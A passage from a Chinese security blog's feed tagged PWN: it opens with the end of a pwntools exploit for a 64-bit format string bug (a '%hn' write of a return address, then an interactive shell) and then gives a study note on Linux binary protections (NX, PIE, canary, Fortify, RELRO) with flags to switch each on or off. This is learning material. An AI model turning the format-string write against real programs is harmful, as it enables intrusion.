class="string">&quot;%2218u%12$hn&quot;</span> + p64(ret_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;格式化字符串漏洞例子&quot;&gt;&lt;a href=&quot;#格式化字符串漏洞例子&quot; class=&quot;headerlink&quot; title=&quot;格式化字符串漏洞例子&quot;&gt;&lt;/a&gt;格式化字符串漏洞例子&lt;/h1&gt;&lt;h2 id=&quot;64位程序格式化字符串漏洞&quot;&gt;&lt;a hr</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Linux保护技术</title>
    <link href="http://example.com/2021/02/02/Linux%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/"/>
    <id>http://example.com/2021/02/02/Linux%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/</id>
    <published>2021-02-02T15:09:51.000Z</published>
    <updated>2021-06-01T16:19:00.993Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="linux保护技术"><a href="#linux保护技术" class="headerlink" title="linux保护技术"></a>linux保护技术</h1><h2 id="NX保护"><a href="#NX保护" class="headerlink" title="NX保护"></a>NX保护</h2><h3 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h3><p>​    将数据（栈，堆）所在内存页标识为不可执行，当程序成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令</p><h3 id="编译选项："><a href="#编译选项：" class="headerlink" title="编译选项："></a>编译选项：</h3><ul><li>关闭：</li></ul><blockquote><p>-z execstack</p></blockquote><ul><li>开启：</li></ul><blockquote><p>-z noexecstack</p></blockquote><h2 id="PIE保护"><a href="#PIE保护" class="headerlink" title="PIE保护"></a>PIE保护</h2><h3 id="作用：-1"><a href="#作用：-1" class="headerlink" title="作用："></a>作用：</h3><p>​    使得程序地址空间分布随机化，增加ROP等利用的难度</p><h3 id="编译选项：-1"><a href="#编译选项：-1" class="headerlink" title="编译选项："></a>编译选项：</h3><ul><li>​    关闭：</li></ul><blockquote><p>-no-pie</p></blockquote><ul><li>​    开启：</li></ul><blockquote><p>-pie -fPIC</p></blockquote><h2 id="canary保护"><a href="#canary保护" class="headerlink" title="canary保护"></a>canary保护</h2><h3 id="作用：-2"><a href="#作用：-2" class="headerlink" title="作用："></a>作用：</h3><p>​    函数开始执行的时候会先往栈里插入canary值，当函数真正返回的时候会验证canary值是否合法，如果不合法就停止程序运行。可以防止栈溢出覆盖返回地址</p><h3 id="编译选项：-2"><a href="#编译选项：-2" class="headerlink" title="编译选项："></a>编译选项：</h3><ul><li>关闭：</li></ul><blockquote><p>-fno-stack-protector</p></blockquote><ul><li>启用（只为局部变量中含有char的函数插入保护代码）：</li></ul><blockquote><p>-fstack-protector、</p></blockquote><ul><li>启用（为所有函数插入保护代码）：</li></ul><blockquote><p>-fstack-proctor-all</p></blockquote><h2 id="Fortify保护"><a href="#Fortify保护" class="headerlink" title="Fortify保护"></a>Fortify保护</h2><h3 id="作用：-3"><a href="#作用：-3" class="headerlink" title="作用："></a>作用：</h3><p>主要用来防止格式化字符串漏洞。包含%n的格式化字符串不能位于程序内存中的可写地址。当使用位置参数时，必须使用范围内的所有参数，如果要使用%7$x，必须同时使用1$2$3$4$5$6$。</p><h3 id="编译选项：-3"><a href="#编译选项：-3" class="headerlink" title="编译选项："></a>编译选项：</h3><ul><li>关闭：</li></ul><blockquote><p>-D_FORTIFY_SOURCE=0</p></blockquote><ul><li>开启：</li></ul><blockquote><p>-D_FORTIFY_SOURCE=2</p></blockquote><h2 id="RELRO保护"><a href="#RELRO保护" class="headerlink" title="RELRO保护"></a>RELRO保护</h2><h3 id="作用：-4"><a href="#作用：-4" class="headerlink" title="作用："></a>作用：</h3><p>设置符号重定位表为只读，并在程序启动时就解析并绑定所有动态符号，从而对GOT表攻击。</p><h3 id="编译选项：-4"><a href="#编译选项：-4" class="headerlink" title="编译选项："></a>编译选项：</h3><ul><li>开启（部分）：</li></ul><blockquote><p>-z lazy</p></blockquote><ul><li>开启（全部）：</li></ul><blockquote><p>-z now</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;linux保护技术&quot;&gt;&lt;a href=&quot;#linux保护技术&quot; class=&quot;headerlink&quot; title=&quot;linux保护技术&quot;&gt;&lt;/a&gt;linux保护技术&lt;/h1&gt;&lt;h2 id=&quot;NX保护&quot;&gt;&lt;a href=&quot;#NX保护&quot; cl</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
</feed>
